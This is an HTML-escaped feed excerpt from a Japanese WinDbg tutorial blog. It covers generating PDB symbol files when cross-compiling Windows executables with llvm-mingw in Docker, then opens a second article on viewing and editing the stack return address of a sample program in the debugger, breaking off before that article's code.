&lt;li&gt;&lt;a href=&quot;#%E3%83%93%E3%83%AB%E3%83%89%E7%92%B0%E5%A2%83%E3%82%92%E6%95%B4%E3%81%88%E3%82%8B&quot;&gt;ビルド環境を整える&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%B7%E3%83%B3%E3%83%9C%E3%83%AB%E3%83%95%E3%82%A1%E3%82%A4%E3%83%ABpdb%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%A8%E3%81%AF&quot;&gt;シンボルファイル（.pdbファイル）とは&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#linux%E7%92%B0%E5%A2%83%E3%81%A7%E3%82%B3%E3%83%B3%E3%83%91%E3%82%A4%E3%83%AB%E6%99%82%E3%81%AB%E3%82%B7%E3%83%B3%E3%83%9C%E3%83%AB%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%82%92%E7%94%9F%E6%88%90%E3%81%99%E3%82%8B%E6%96%B9%E6%B3%95&quot;&gt;Linux環境でコンパイル時にシンボルファイルを生成する方法&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#llvm-mingw%E3%81%AE%E7%92%B0%E5%A2%83%E3%82%92%E7%94%A8%E6%84%8F%E3%81%99%E3%82%8B&quot;&gt;llvm-mingwの環境を用意する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#llvm-mingw%E3%81%A7pdb%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E4%BB%98%E3%81%8D%E3%81%A7c%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%82%92%E3%82%B3%E3%83%B3%E3%83%91%E3%82%A4%E3%83%AB%E3%81%99%E3%82%8B&quot;&gt;llvm-mingwでPDBファイル付きでC++ファイルをコンパイルする&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;ビルド環境を整える&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%93%E3%83%AB%E3%83%89%E7%92%B0%E5%A2%83%E3%82%92%E6%95%B4%E3%81%88%E3%82%8B&quot; aria-label=&quot;ビルド環境を整える permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ビルド環境を整える&lt;/h2&gt;
&lt;p&gt;WinDbgテスト用のプログラムは、以下のリポジトリに置いてあります。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/kash1064/Try2WinDbg&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;kash1064/Try2WinDbg&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;まずは、Dockerが利用可能なOS上の任意のディレクトリに上記のリポジトリをcloneします。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;git&lt;/span&gt; clone https://github.com/kash1064/Try2WinDbg&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;続いて、コンパイル用の以下のコンテナイメージをpullします。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;docker&lt;/span&gt; pull kashiwabayuki/try2windbg:1.0&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://hub.docker.com/r/kashiwabayuki/try2windbg&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;kashiwabayuki/try2windbg&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;このコンテナイメージは、&lt;a href=&quot;https://hub.docker.com/r/mstorsjo/llvm-mingw/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;mstorsjo/llvm-mingw&lt;/a&gt;のコンテナイメージを一部カスタマイズしたイメージです。&lt;/p&gt;
&lt;p&gt;詳細については後述します。&lt;/p&gt;
&lt;p&gt;サンプルプログラムのリポジトリとコンテナイメージの取得が完了したら、ダウンロードした&lt;code class=&quot;language-text&quot;&gt;Try2WinDbg&lt;/code&gt;ディレクトリに移動します。&lt;/p&gt;
&lt;p&gt;続いて、以下のコマンドを入力することで、&lt;code class=&quot;language-text&quot;&gt;Try2WinDbg/src&lt;/code&gt;直下に、コンパイルされたEXEファイルとシンボルファイルが生成されます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token builtin class-name&quot;&gt;cd&lt;/span&gt; Try2WinDbg

&lt;span class=&quot;token comment&quot;&gt;# ビルドに使用するコンテナイメージを指定&lt;/span&gt;
&lt;span class=&quot;token assign-left variable&quot;&gt;CONTAINER&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;kashiwabayuki/try2windbg:1.0
&lt;span class=&quot;token function&quot;&gt;docker&lt;/span&gt; run --rm -it -v &lt;span class=&quot;token variable&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;token builtin class-name&quot;&gt;pwd&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;`&lt;/span&gt;&lt;/span&gt;/src:/try2windbg &lt;span class=&quot;token variable&quot;&gt;$CONTAINER&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;bash&lt;/span&gt; -c &lt;span class=&quot;token string&quot;&gt;&quot;cd /try2windbg &amp;amp;&amp;amp; make&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;これで、環境構築は完了です。&lt;/p&gt;
&lt;h2 id=&quot;シンボルファイルpdbファイルとは&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%B7%E3%83%B3%E3%83%9C%E3%83%AB%E3%83%95%E3%82%A1%E3%82%A4%E3%83%ABpdb%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%A8%E3%81%AF&quot; aria-label=&quot;シンボルファイルpdbファイルとは permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;シンボルファイル（.pdbファイル）とは&lt;/h2&gt;
&lt;p&gt;拡張子&lt;code class=&quot;language-text&quot;&gt;.pdb&lt;/code&gt;を持つファイルは、シンボルファイルと呼ばれるファイルです。&lt;/p&gt;
&lt;p&gt;PDBは、「プログラムデータベース」の略称で、プロジェクトのソースコード内の識別子とステートメントをコンパイル済みアプリの対応する識別子と命令にマッピングしています。&lt;/p&gt;
&lt;p&gt;このシンボルファイルを利用することで、デバッガを用いてアプリケーションやプロセスの解析を行う際に、非常に効率的な解析を行うことができます。&lt;/p&gt;
&lt;p&gt;シンボルファイルがなくても、デバッガによる解析は可能です。&lt;/p&gt;
&lt;p&gt;しかし、適切なシンボルファイルが読み込まれている場合と読み込まれていない場合には、同じアドレスを指し示す場合にも、デバッガ上で次のような表示の差異が発生します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;sample+0x110     &lt;span class=&quot;token comment&quot;&gt;# シンボルファイルなし&lt;/span&gt;
sample&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;main+0x10 &lt;span class=&quot;token comment&quot;&gt;# シンボルファイルあり&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;シンボルファイルを適切に読み込ませることで、被疑箇所をスムーズに特定したり、関数名から挙動を類推したりと、より効率的にデバッグを行うことができるようになります。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/visualstudio/debugger/specify-symbol-dot-pdb-and-source-files-in-the-visual-studio-debugger?view=vs-2019&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;デバッガーでシンボル (.pdb) ファイルとソース ファイルを設定する | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;linux環境でコンパイル時にシンボルファイルを生成する方法&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#linux%E7%92%B0%E5%A2%83%E3%81%A7%E3%82%B3%E3%83%B3%E3%83%91%E3%82%A4%E3%83%AB%E6%99%82%E3%81%AB%E3%82%B7%E3%83%B3%E3%83%9C%E3%83%AB%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%82%92%E7%94%9F%E6%88%90%E3%81%99%E3%82%8B%E6%96%B9%E6%B3%95&quot; aria-label=&quot;linux環境でコンパイル時にシンボルファイルを生成する方法 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Linux環境でコンパイル時にシンボルファイルを生成する方法&lt;/h2&gt;
&lt;p&gt;Windowsアプリケーションのデバッグ時に非常に重要なシンボルファイルですが、Microsoftコンパイラの場合はビルド時に自動的に作成されます。&lt;/p&gt;
&lt;p&gt;しかし、MinGWなどを用いてLinux環境でクロスコンパイルを行う場合は、シンボルファイルは通常生成されません。&lt;/p&gt;
&lt;p&gt;MinGWでクロスコンパイルしたEXEファイルのシンボルファイルを作成する方法については、以下のStackOverFlowのように、&lt;code class=&quot;language-text&quot;&gt;cv2pdb&lt;/code&gt;を用いた方法が案内されるケースもありますが、この方法ではLinux環境ではシンボルファイルの作成ができません。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://stackoverflow.com/questions/19269350/how-to-generate-pdb-files-while-building-library-using-mingw/28627790&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;c++ - how to generate pdb files while building library using mingw? - Stack Overflow&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;そこで今回は、&lt;a href=&quot;https://github.com/mstorsjo/llvm-mingw&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;llvm-mingw&lt;/a&gt;を用いた方法を利用しました。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/mstorsjo/llvm-mingw&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;llvm-mingw&lt;/a&gt;とは、&lt;a href=&quot;https://llvm.org/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;LLVM&lt;/a&gt;/&lt;a href=&quot;https://clang.llvm.org/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Clang&lt;/a&gt;/&lt;a href=&quot;https://lld.llvm.org/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;LLD&lt;/a&gt; をベースにした&lt;code class=&quot;language-text&quot;&gt;mingw-w64&lt;/code&gt;のツールチェーンです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/mstorsjo/llvm-mingw&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;mstorsjo/llvm-mingw: An LLVM/Clang/LLD based mingw-w64 toolchain&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;LLVMとは、一言で言うとプラットフォームに依存せずに任意のプログラミング言語のコンパイルを行うことができる基盤です。&lt;/p&gt;
&lt;p&gt;また、ClangとLLDは、LLVM用のC言語とリンカです。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/mstorsjo/llvm-mingw&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;llvm-mingw&lt;/a&gt;は、通常のMinGWがGNUベースのbinutilsをLLVMベースのbinutilsに置き換えたものです。&lt;/p&gt;
&lt;p&gt;これによって、様々なコンピュータアーキテクチャ（i686、x86_64、armv7、arm64）に対して単一のツールチェーンでのコンパイルを実現しています。
また、PDB形式でのシンボルファイルの生成もできるようになります。&lt;/p&gt;
&lt;h2 id=&quot;llvm-mingwの環境を用意する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#llvm-mingw%E3%81%AE%E7%92%B0%E5%A2%83%E3%82%92%E7%94%A8%E6%84%8F%E3%81%99%E3%82%8B&quot; aria-label=&quot;llvm mingwの環境を用意する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;llvm-mingwの環境を用意する&lt;/h2&gt;
&lt;p&gt;LLVMベースのMinGWを利用できる環境を用意するために最も簡単な方法は、公式の用意している&lt;a href=&quot;https://hub.docker.com/r/mstorsjo/llvm-mingw/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Dockerイメージ&lt;/a&gt;を使用することです。&lt;/p&gt;
&lt;p&gt;基本的には、このイメージをDockerhubからpullするだけで、簡単に利用できるようになります。&lt;/p&gt;
&lt;p&gt;もしDockerコンテナではなく、Linuxのホスト上にllvm-mingwの環境を構築する必要がある場合は、以下のDockerfile内のスクリプトを参考にするとよいです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/mstorsjo/llvm-mingw/blob/master/Dockerfile.cross&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;llvm-mingw/Dockerfile.cross at master · mstorsjo/llvm-mingw&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;llvm-mingwでpdbファイル付きでcファイルをコンパイルする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#llvm-mingw%E3%81%A7pdb%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E4%BB%98%E3%81%8D%E3%81%A7c%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%82%92%E3%82%B3%E3%83%B3%E3%83%91%E3%82%A4%E3%83%AB%E3%81%99%E3%82%8B&quot; aria-label=&quot;llvm mingwでpdbファイル付きでcファイルをコンパイルする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;llvm-mingwでPDBファイル付きでC++ファイルをコンパイルする&lt;/h2&gt;
&lt;p&gt;llvm-mingwの使い方は以下の通りです。&lt;/p&gt;
&lt;p&gt;公式のDockerイメージの場合は、すでにLLVMベースのMinGWに対して、&lt;code class=&quot;language-text&quot;&gt;x86_64-w64-mingw32-g++&lt;/code&gt;としてパスが通っています。&lt;/p&gt;
&lt;p&gt;これを利用して、&lt;code class=&quot;language-text&quot;&gt;-Wl,-pdb=&amp;lt;filename&gt;.pdb&lt;/code&gt;というオプションを付けてコンパイルを実行することで、EXEファイルのコンパイルと同時にシンボルファイルも作成されます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;x86_64-w64-mingw32-g++ -Wl,-pdb&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;sample.pdb sample.cpp -o sample.exe&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;今回は、Linux環境でWindows向けのEXEファイルをクロスコンパイルする際に、デバッグ用のシンボルファイルを作成する方法についてまとめました。&lt;/p&gt;</content:encoded></item><item><title><![CDATA[WinDbgでスタックポインタの指すメモリの情報を書き換えて任意の関数を実行させてみる]]></title><link>https://kashiwaba-yuki.com/windows-windbg-007-memory-spoofing</link><guid isPermaLink="false">https://kashiwaba-yuki.com/windows-windbg-007-memory-spoofing</guid><pubDate>Mon, 18 Oct 2021 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;WinDbgによるWindowsデバッグやダンプ解析によるトラブルシューティングに習熟することを目指しています。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/windows-windbg-002-tutorial&quot;&gt;WinDbgのユーザモードデバッグチュートリアルを試してみた&lt;/a&gt;では、WinDbgを用いてユーザモードアプリケーションのデバッグを行う方法について紹介しました。&lt;/p&gt;
&lt;p&gt;今回は、ユースケース別のWinDbgの使い方として、ユーザモードアプリケーションのライブデバッグ時に、メモリやレジスタの情報を確認する方法について紹介します。&lt;/p&gt;
&lt;p&gt;WinDbgを用いたWindowsのデバッグやダンプの解析方法について公開している情報については、以下のページに一覧をまとめているので、よければご覧ください。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;/windows-windbg-001-index&quot;&gt;WinDbgを用いたデバッグとトラブルシューティングのテクニック&lt;/a&gt;&lt;/p&gt;
&lt;!-- omit in toc --&gt;
&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E4%BB%8A%E5%9B%9E%E3%81%AE%E7%9B%AE%E6%A8%99&quot;&gt;今回の目標&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E6%9C%AC%E8%A8%98%E4%BA%8B%E3%81%A7%E4%BD%BF%E7%94%A8%E3%81%99%E3%82%8B%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%A0&quot;&gt;本記事で使用するサンプルプログラム&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#windbg%E3%81%A7%E3%82%A2%E3%83%97%E3%83%AA%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%82%92%E8%B5%B7%E5%8B%95%E3%81%99%E3%82%8B&quot;&gt;WinDbgでアプリケーションを起動する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#main-%E9%96%A2%E6%95%B0%E3%81%AE%E3%82%A2%E3%83%89%E3%83%AC%E3%82%B9%E3%81%AB%E3%83%96%E3%83%AC%E3%83%BC%E3%82%AF%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88%E3%82%92%E8%A8%AD%E5%AE%9A%E3%81%99%E3%82%8B&quot;&gt;main 関数のアドレスにブレークポイントを設定する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#return_addr%E9%96%A2%E6%95%B0%E3%81%AB%E3%83%96%E3%83%AC%E3%83%BC%E3%82%AF%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88%E3%82%92%E8%A8%AD%E5%AE%9A%E3%81%99%E3%82%8B&quot;&gt;return_addr関数にブレークポイントを設定する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%A1%E3%83%A2%E3%83%AA%E3%81%AE%E6%83%85%E5%A0%B1%E3%82%92%E5%8F%82%E7%85%A7%E3%81%99%E3%82%8B&quot;&gt;メモリの情報を参照する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%A1%E3%83%A2%E3%83%AA%E3%81%AE%E6%83%85%E5%A0%B1%E3%82%92%E6%94%B9%E3%81%96%E3%82%93%E3%81%99%E3%82%8B&quot;&gt;メモリの情報を改ざんする&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;今回の目標&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E4%BB%8A%E5%9B%9E%E3%81%AE%E7%9B%AE%E6%A8%99&quot; aria-label=&quot;今回の目標 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;今回の目標&lt;/h2&gt;
&lt;p&gt;今回の目標は以下の2点です。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;関数呼び出し時に、RSP/BSPに関数の実行が終了した後に呼び出される命令のアドレスが格納されることを確認する&lt;/li&gt;
&lt;li&gt;RSPの参照するメモリ情報を改ざんして、任意の関数を実行させる&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;今回は、WinDbgによるユーザモードアプリケーションのライブデバッグで、プログラムの各所にブレークポイントを設定し、関数呼び出し時のスタックの情報を参照していきます。&lt;/p&gt;
&lt;p&gt;また、WinDbgからメモリの情報を改ざんして、任意のプログラムを実行させてみます。&lt;/p&gt;
&lt;h2 id=&quot;本記事で使用するサンプルプログラム&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E6%9C%AC%E8%A8%98%E4%BA%8B%E3%81%A7%E4%BD%BF%E7%94%A8%E3%81%99%E3%82%8B%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%A0&quot; aria-label=&quot;本記事で使用するサンプルプログラム permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;本記事で使用するサンプルプログラム&lt;/h2&gt;
&lt;p&gt;今回テストに使用するのは、以下のソースコードからなるプログラムです。&lt;/p&gt;
&lt;p&gt;実行されると&lt;code class=&quot;language-text&quot;&gt;ret_func&lt;/code&gt;関数を呼び出して、いくつか文字列を出力した後に終了するプログラムです。&lt;/p&gt;
